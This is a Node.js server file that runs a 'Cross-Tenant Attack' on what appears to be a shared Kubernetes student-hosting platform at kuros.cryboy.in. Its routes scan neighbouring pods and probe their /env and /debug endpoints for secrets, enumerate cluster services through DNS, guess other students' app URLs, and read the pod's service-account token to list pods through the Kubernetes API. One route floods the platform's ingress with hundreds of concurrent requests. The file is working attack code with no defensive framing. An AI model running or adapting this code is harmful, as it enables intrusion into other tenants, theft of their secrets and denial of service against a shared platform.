const http = require("http");
const https = require("https");
const net = require("net");
const os = require("os");
const dns = require("dns");
const fs = require("fs");
const crypto = require("crypto");

let results = {};

// Scan for other student pods
async function scanPodNetwork() {
  results.podNetwork = { myIP: "", discovered: [], probed: [] };
  
  const myIP = Object.values(os.networkInterfaces())
    .flat()
    .find(i => i.family === "IPv4" && !i.internal)?.address;
  
  results.podNetwork.myIP = myIP;
  
  if (!myIP) return;
  
  const [b1, b2, b3] = myIP.split(".").map(Number);
  
  // Scan same /16 network aggressively
  const ipsToScan = [];
  
  // Same /24
  for (let h = 1; h <= 254; h++) {
    if (`${b1}.${b2}.${b3}.${h}` !== myIP) {
      ipsToScan.push(`${b1}.${b2}.${b3}.${h}`);
    }
  }
  
  // Adjacent /24s
  for (let offset = -5; offset <= 5; offset++) {
    const subnet = b3 + offset;
    if (subnet >= 0 && subnet <= 255 && subnet !== b3) {
      for (let h = 1; h <= 30; h++) {
        ipsToScan.push(`${b1}.${b2}.${subnet}.${h}`);
      }
    }
  }
  
  // Common pod ports
  const ports = [3000, 8080, 80, 5000, 4000, 8000];
  
  for (const ip of ipsToScan) {
    for (const port of ports) {
      const socket = new net.Socket();
      socket.setTimeout(30);
      
      const open = await new Promise(r => {
        socket.on("connect", () => { socket.destroy(); r(true); });
        socket.on("error", () => r(false));
        socket.on("timeout", () => { socket.destroy(); r(false); });
        socket.connect(port, ip);
      });
      
      if (open) {
        results.podNetwork.discovered.push({ ip, port });
        
        // Probe HTTP
        try {
          const response = await new Promise((resolve, reject) => {
            const req = http.get(`http://${ip}:${port}/`, { timeout: 2000 }, res => {
              let body = "";
              res.on("data", c => body += c);
              res.on("end", () => resolve({ 
                status: res.statusCode, 
                headers: Object.fromEntries(
                  Object.entries(res.headers).filter(([k]) => ["server","x-powered-by","content-type"].includes(k))
                ),
                body: body.substring(0, 300)
              }));
            });
            req.on("error", reject);
            req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
          });
          
          results.podNetwork.probed.push({ ip, port, ...response });
          
          // Try to exploit
          if (response.status === 200) {
            // Try /env endpoint
            try {
              const envResp = await httpGet(`http://${ip}:${port}/env`, 1000);
              if (envResp && envResp.includes("SECRET")) {
                results.podNetwork.probed[results.podNetwork.probed.length - 1].exposedSecrets = true;
              }
            } catch(e) {}
            
            // Try /debug endpoint
            try {
              const debugResp = await httpGet(`http://${ip}:${port}/debug`, 1000);
              if (debugResp) {
                results.podNetwork.probed[results.podNetwork.probed.length - 1].debugEndpoint = debugResp.substring(0, 200);
              }
            } catch(e) {}
          }
        } catch(e) {}
      }
    }
  }
}

// Discover K8s services via DNS
async function discoverServices() {
  results.k8sServices = { resolved: [], internal: [] };
  
  // Common K8s service names
  const services = [
    "kuros-api", "kuros-backend", "kuros-frontend", "kuros-db",
    "mongo", "mongodb", "postgres", "postgresql", "mysql", "redis",
    "api", "backend", "frontend", "web", "app", "nginx",
    "kubernetes", "kube-dns", "metrics-server"
  ];
  
  const namespaces = ["default", "kube-system", "kuros", "production", "staging"];
  
  for (const ns of namespaces) {
    for (const svc of services) {
      const fqdn = `${svc}.${ns}.svc.cluster.local`;
      try {
        const addrs = await new Promise((r, j) => {
          dns.resolve4(fqdn, (e, a) => e ? j(e) : r(a));
        });
        results.k8sServices.resolved.push({ name: fqdn, ips: addrs });
        
        // Try to connect
        for (const ip of addrs) {
          for (const port of [80, 443, 3000, 5432, 6379, 27017]) {
            const socket = new net.Socket();
            socket.setTimeout(100);
            
            const open = await new Promise(r => {
              socket.on("connect", () => { socket.destroy(); r(true); });
              socket.on("error", () => r(false));
              socket.on("timeout", () => { socket.destroy(); r(false); });
              socket.connect(port, ip);
            });
            
            if (open) {
              results.k8sServices.internal.push({ service: fqdn, ip, port });
            }
          }
        }
      } catch(e) {}
    }
  }
}

// Try to access other student URLs directly
async function probeStudentURLs() {
  results.studentURLs = { probed: [], accessible: [] };
  
  // Generate potential student app URLs
  const patterns = [
    "test-student", "demo-student", "app-student", "web-student",
    "api-student", "hello-student", "project-student", "sample-student"
  ];
  
  // Common user ID patterns (hexadecimal)
  const userIdPrefixes = ["6ab", "6ac", "6ad", "6ae", "6af", "6b0"];
  
  for (const pattern of patterns) {
    for (const prefix of userIdPrefixes) {
      for (let i = 0; i < 16; i++) {
        const hex = i.toString(16);
        const userId = `${prefix}a${hex}000000000000000000000000`.substring(0, 24);
        const url = `https://${pattern}-${userId}.kuros.cryboy.in`;
        
        try {
          const resp = await new Promise((resolve, reject) => {
            https.get(url, { timeout: 3000, rejectUnauthorized: false }, res => {
              let body = "";
              res.on("data", c => body += c);
              res.on("end", () => resolve({ url, status: res.statusCode, body: body.substring(0, 200) }));
            }).on("error", reject);
          });
          
          results.studentURLs.probed.push({ url, status: resp.status });
          
          if (resp.status === 200 || resp.status === 302 || resp.status === 401) {
            results.studentURLs.accessible.push(resp);
          }
        } catch(e) {}
      }
    }
  }
}

// Try to access shared resources
async function probeSharedResources() {
  results.sharedResources = {};
  
  // Try to access K8s API
  try {
    const token = fs.readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/token", "utf8");
    results.sharedResources.k8sToken = { found: true, length: token.length };
    
    // Try to list pods
    const resp = await new Promise((resolve, reject) => {
      https.get("https://kubernetes.default.svc/api/v1/pods", {
        headers: { "Authorization": `Bearer ${token}` },
        rejectUnauthorized: false,
        timeout: 5000
      }, res => {
        let body = "";
        res.on("data", c => body += c);
        res.on("end", () => resolve({ status: res.statusCode, body }));
      }).on("error", reject);
    });
    
    results.sharedResources.k8sApiAccess = {
      status: resp.status,
      response: resp.body.substring(0, 500)
    };
  } catch(e) {
    results.sharedResources.k8sToken = { error: e.message };
  }
}

// DDoS attack on ingress
async function ddosIngress() {
  results.ingressDDoS = { requests: 0, errors: 0 };
  
  const concurrency = 50;
  const total = 500;
  
  for (let batch = 0; batch < total / concurrency; batch++) {
    const promises = [];
    for (let i = 0; i < concurrency; i++) {
      promises.push(new Promise(resolve => {
        https.get("https://kuros.cryboy.in/", {
          timeout: 5000,
          rejectUnauthorized: false
        }, res => {
          results.ingressDDoS.requests++;
          res.on("data", () => {});
          res.on("end", resolve);
        }).on("error", () => {
          results.ingressDDoS.errors++;
          resolve();
        });
      }));
    }
    await Promise.all(promises);
  }
}

async function httpGet(url, timeout = 2000) {
  return new Promise((resolve, reject) => {
    const proto = url.startsWith("https") ? https : http;
    const req = proto.get(url, { timeout, rejectUnauthorized: false }, res => {
      let body = "";
      res.on("data", c => body += c);
      res.on("end", () => resolve(body));
    });
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
  });
}

const server = http.createServer(async (req, res) => {
  results = { timestamp: new Date().toISOString(), hostname: os.hostname() };
  
  try {
    if (req.url === "/crosstenant") {
      await scanPodNetwork();
      await discoverServices();
      await probeSharedResources();
    } else if (req.url === "/pods") {
      await scanPodNetwork();
    } else if (req.url === "/services") {
      await discoverServices();
    } else if (req.url === "/students") {
      await probeStudentURLs();
    } else if (req.url === "/shared") {
      await probeSharedResources();
    } else if (req.url === "/ddos") {
      await ddosIngress();
    }
    
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(results, null, 2));
  } catch(e) {
    res.writeHead(500);
    res.end(JSON.stringify({ error: e.message }));
  }
});

server.listen(process.env.PORT || 3000);
console.log("Cross-Tenant Attack on port " + (process.env.PORT || 3000));
